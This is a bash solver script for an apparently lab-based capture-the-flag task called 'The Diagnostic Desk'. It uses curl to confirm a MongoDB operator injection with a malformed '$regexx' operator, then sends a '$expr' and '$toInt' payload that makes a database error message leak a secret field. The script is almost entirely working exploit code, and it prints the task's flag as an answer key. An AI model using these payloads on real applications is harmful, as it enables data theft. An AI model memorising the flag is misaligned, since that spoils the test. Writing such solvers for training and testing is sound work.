#!/usr/bin/env bash
# solvers/p4_2.sh, Task 4.2 "The Diagnostic Desk" canonical exploit.
#
# Same {field: value} -> MongoDB sink as p4_3's Records Room, but this
# console does not swallow driver exceptions. Two techniques, in order:
#   1. Detection: a deliberately malformed/unknown operator produces a
#      distinct OperationFailure, confirming the injection exists without
#      needing to infer it from boolean behavior.
#   2. Weaponization: field="$expr" + a $toInt conversion against the real
#      field forces MongoDB to try (and fail) to parse the flag as a
#      number, and the resulting error message embeds the flag verbatim,
#      a one-shot leak, no blind walking required.
set -uo pipefail

BASE="${SEIYAKU_BASE:-http://localhost:8000}"
FLAG="SEIYAKU{the_error_said_it_all}"
ROUTE="${BASE}/p4/diagnostics"

echo "[p4_2] target: ${ROUTE}"

# --- Step 1: detection via a deliberately malformed/unknown operator -------
echo "[p4_2] step 1: confirm injection via an unknown-operator error"
DETECT=$(curl -s -G "$ROUTE" -H "Accept: application/json" \
    --data-urlencode "field=archive_key" \
    --data-urlencode 'value[$regexx]=x')
if echo "$DETECT" | grep -qi "unknown operator"; then
    echo "  ok: unknown-operator error surfaced, injection confirmed in one request"
    echo "  response: $DETECT"
else
    echo "[p4_2] FAIL: expected an 'unknown operator' error, got: $DETECT"
    exit 1
fi

# --- Step 2: confirm a WELL-FORMED unknown field still reads as a quiet ----
# miss (no error), proving step 1's signal is specifically about malformed
# operators, not just "any query against this console produces an error".
echo "[p4_2] step 2: confirm an ordinary miss produces no error (sanity check)"
MISS=$(curl -s -G "$ROUTE" -H "Accept: application/json" \
    --data-urlencode "field=archive_key" --data-urlencode "value=nope")
if echo "$MISS" | python3 -c "import json,sys; d=json.load(sys.stdin); exit(0 if d.get('error') is None and d.get('matched') is False else 1)"; then
    echo "  ok: ordinary miss is error:null, matched:false, as expected"
else
    echo "[p4_2] FAIL: ordinary miss did not read as a quiet non-match: $MISS"
    exit 1
fi

# --- Step 3: the one-shot $expr + $toInt leak -------------------------------
echo "[p4_2] step 3: one-shot leak via \$expr + \$toInt conversion failure"
LEAK=$(curl -s -X POST "$ROUTE" -H "Content-Type: application/json" -H "Accept: application/json" \
    -d '{"field":"$expr","value":{"$eq":["$archive_key",{"$toInt":"$archive_key"}]}}')
echo "  response: $LEAK"
if echo "$LEAK" | grep -qF "$FLAG"; then
    echo "  ok: flag recovered directly from the \$convert error message: ${FLAG}"
else
    echo "[p4_2] FAIL: flag did not appear in the \$convert error message"
    exit 1
fi

echo "[p4_2] ok: detection confirmed injection in one request, weaponization"
echo "[p4_2]     leaked the flag in one more, no blind walking anywhere"
echo "[p4_2] PASS"
exit 0
